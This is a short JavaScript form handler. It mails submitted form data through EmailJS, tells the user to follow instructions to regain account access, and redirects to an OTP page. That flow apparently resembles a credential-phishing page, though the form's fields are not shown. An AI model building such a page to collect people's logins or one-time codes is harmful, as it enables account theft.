const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Sending...';

   const serviceID = 'default_service';
   const templateID = 'template_ccsbzht';

   
    emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Send Email';
      alert('E-mail is Sent!  Please follow the instruction to access you account again.');
      window.location.href="otp.html";
    }, (err) => {
      btn.value = 'Send Email';
      alert(JSON.stringify(err));
    });
   

});